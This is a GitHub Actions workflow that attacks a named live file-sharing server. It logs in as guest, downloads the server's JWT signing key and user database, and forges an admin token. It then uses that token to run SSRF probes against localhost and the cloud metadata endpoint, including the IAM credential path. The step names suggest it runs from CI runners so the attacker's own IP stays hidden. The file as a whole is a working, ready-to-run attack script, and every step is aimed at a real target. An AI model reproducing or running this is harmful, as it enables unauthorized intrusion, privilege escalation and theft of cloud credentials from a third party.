name: openlist-admin-ssrf
on:
  workflow_dispatch:
jobs:
  admin:
    runs-on: ubuntu-latest
    steps:
      - name: reharvest jwt.key + dump schema + forge admin JWT + SSRF (zero own-IP)
        run: |
          set +e
          B="https://pan.yazinb.icu"
          TOKEN=$(curl -skS -m20 -X POST "$B/api/auth/login" -H "Content-Type: application/json" -d '{"username":"guest","password":"guest"}' | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('data',{}).get('token',''))")
          echo "guest_token_len=${#TOKEN}"
          SUB=$(curl -skS -m30 -X POST "$B/api/fs/list" -H "Authorization: $TOKEN" -H "Content-Type: application/json" -d '{"path":"/"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['data']['content'][0]['name'])")
          echo "SUB=[$SUB]"
          get_raw () { curl -skS -m30 -X POST "$B/api/fs/get" -H "Authorization: $TOKEN" -H "Content-Type: application/json" -d "{\"path\":\"$1\"}" | python3 -c "import sys,json;print(json.load(sys.stdin).get('data',{}).get('raw_url',''))"; }
          dl () { curl -skS -m120 "$1" -o "$2" -w "  dl $2 -> HTTP %{http_code} bytes=%{size_download}\n"; }
          U=$(get_raw "/$SUB/jwt.key"); dl "$U" /tmp/jwt.key
          echo "jwt.key ascii=[$(cat /tmp/jwt.key)]  sha256=$(sha256sum /tmp/jwt.key|cut -c1-32)"
          U=$(get_raw "/$SUB/data/artex.sqlite"); dl "$U" /tmp/artex.sqlite
          echo "artex.sqlite size=$(wc -c < /tmp/artex.sqlite)"
          echo "=== SCHEMA + FORGE (visible diagnostics, robust table pick) ==="
          python3 - <<'PY' 2>&1 | tee /tmp/forge.out
          import sqlite3,hmac,hashlib,base64,json,time
          c=sqlite3.connect('/tmp/artex.sqlite')
          alltabs=[r[0] for r in c.execute("select name from sqlite_master where type=?",('table',))]
          print("ALLTABLES",alltabs)
          ut=None;uc=[]
          for t in alltabs:
              cols=[d[1] for d in c.execute('PRAGMA table_info(%s)'%t)]
              low=[x.lower() for x in cols]
              has_user=any(('user' in x) or ('uname' in x) for x in low)
              has_pass=any(('pass' in x) or ('pwd' in x) or ('hash' in x) for x in low)
              has_role=any(('role' in x) or ('perm' in x) for x in low)
              print("TAB",t,"COLS",cols)
              if has_user and (has_pass or has_role) and ut is None:
                  ut=t;uc=cols
          if ut is None:
              for t in alltabs:
                  if 'user' in t.lower():
                      ut=t;uc=[d[1] for d in c.execute('PRAGMA table_info(%s)'%t)];break
          print("CHOSEN_UT",ut,"COLS",uc)
          rows=list(c.execute('select * from %s'%ut))
          print("ROWCOUNT",len(rows))
          lc=[x.lower() for x in uc]
          uidx=next((i for i,x in enumerate(lc) if x in ('username','user','uname','name')),0)
          pidx=next((i for i,x in enumerate(lc) if x in ('password','pass','pwd','hash','password_hash')),-1)
          ridx=next((i for i,x in enumerate(lc) if x in ('role','permission','perm','is_admin')),-1)
          admin_row=None
          for r in rows:
              d=dict(zip(uc,r))
              u=str(d.get(uc[uidx]) or '')
              mask=list(r)
              if pidx>=0: mask[pidx]='***'
              print("ROW",dict(zip(uc,mask)))
              if u.lower()=='admin': admin_row=r;break
          if admin_row is None and rows: admin_row=rows[0]
          d=dict(zip(uc,admin_row))
          uname=str(d.get(uc[uidx]) or d.get('username') or '')
          pts=0
          if 'pwd_ts' in lc: pts=d[uc[lc.index('pwd_ts')]]
          print("FORGE_USER",uname,"PWDTS",pts)
          key=open('/tmp/jwt.key','rb').read().strip()
          b=lambda x:base64.urlsafe_b64encode(x).rstrip(b'=')
          now=int(time.time())
          h=b(json.dumps({'alg':'HS256','typ':'JWT'}).encode())
          p=b(json.dumps({'exp':now+3600,'iat':now,'nbf':now,'username':uname,'pwd_ts':int(pts)}).encode())
          s=b(hmac.new(key,h+b'.'+p,hashlib.sha256).digest())
          print("JWT:"+h.decode()+'.'+p.decode()+'.'+s.decode())
          PY
          ADMINJWT=$(grep -E '^JWT:eyJ' /tmp/forge.out | head -1 | sed 's/^JWT://')
          echo "ADMINJWT_LEN=${#ADMINJWT}"
          echo "ADMINJWT_HEAD=${ADMINJWT:0:30}"
          if [ -z "$ADMINJWT" ]; then echo "FORGE FAILED"; cat /tmp/forge.out; exit 0; fi
          echo "--- /api/me (admin verify) ---"
          curl -skS -m20 -X GET "$B/api/me" -H "Authorization: $ADMINJWT" -w "\n  HTTP %{http_code}\n" | head -c 600
          echo "--- /api/admin/setting/list (admin verify) ---"
          curl -skS -m20 -X POST "$B/api/admin/setting/list" -H "Authorization: $ADMINJWT" -H "Content-Type: application/json" -d '{}' -w "\n  HTTP %{http_code}\n" | head -c 400
          echo "--- mkdir ssrf dirs ---"
          for d in ssrf_local80 ssrf_local5244 ssrf_meta ssrf_meta_iam ssrf_self80; do
            curl -skS -m20 -X POST "$B/api/fs/mkdir" -H "Authorization: $ADMINJWT" -H "Content-Type: application/json" -d "{\"path\":\"/$d\"}" -w "  mkdir /$d -> %{http_code}\n" -o /dev/null
          done
          ssrf () {
            name=$1; url=$2
            echo "=== SSRF $name -> $url ==="
            curl -skS -m30 -X POST "$B/api/fs/add_offline_download" -H "Authorization: $ADMINJWT" -H "Content-Type: application/json" -d "{\"path\":\"/$name\",\"urls\":[\"$url\"]}" -w "\n  add HTTP %{http_code}\n" | head -c 400
            sleep 6
            lst=$(curl -skS -m30 -X POST "$B/api/fs/list" -H "Authorization: $ADMINJWT" -H "Content-Type: application/json" -d "{\"path\":\"/$name\"}")
            echo "  list: $(echo "$lst" | head -c 250)"
            fn=$(echo "$lst" | python3 -c "import sys,json;d=json.load(sys.stdin);c=d.get('data',{}).get('content',[]);print(c[0]['name'] if c else '')" 2>/dev/null)
            if [ -n "$fn" ]; then
              ru=$(curl -skS -m30 -X POST "$B/api/fs/get" -H "Authorization: $ADMINJWT" -H "Content-Type: application/json" -d "{\"path\":\"/$name/$fn\"}" | python3 -c "import sys,json;print(json.load(sys.stdin).get('data',{}).get('raw_url',''))" 2>/dev/null)
              echo "  raw_url: $ru"
              echo "  --- internal body (first 800B) ---"
              curl -skS -m30 "$ru" | head -c 800
              echo
            else
              echo "  (no file landed - SSRF blocked or async)"
            fi
          }
          ssrf ssrf_local80 "http://127.0.0.1:80/"
          ssrf ssrf_local5244 "http://127.0.0.1:5244/"
          ssrf ssrf_meta "http://169.254.169.254/latest/meta-data/"
          ssrf ssrf_meta_iam "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
          ssrf ssrf_self80 "http://119.28.135.153:80/"
          echo "--- add-storage-mount SSRF probe (WebDAV -> meta, self-cleaning) ---"
          addresp=$(curl -skS -m30 -X POST "$B/api/admin/storage/create" -H "Authorization: $ADMINJWT" -H "Content-Type: application/json" -d '{"mount_path":"/ssrf_mount","driver":"WebDAV","addition":{"url":"http://169.254.169.254/","username":"x","password":"x"}}')
          echo "  create resp: $(echo "$addresp" | head -c 350)"
          sid=$(echo "$addresp" | python3 -c "import sys,json;print(json.load(sys.stdin).get('data',{}).get('id',''))" 2>/dev/null)
          if [ -n "$sid" ]; then curl -skS -m20 -X POST "$B/api/admin/storage/delete" -H "Authorization: $ADMINJWT" -H "Content-Type: application/json" -d "{\"id\":$sid}" -w "  cleanup delete -> %{http_code}\n" -o /dev/null; fi
          echo "=== DONE ==="
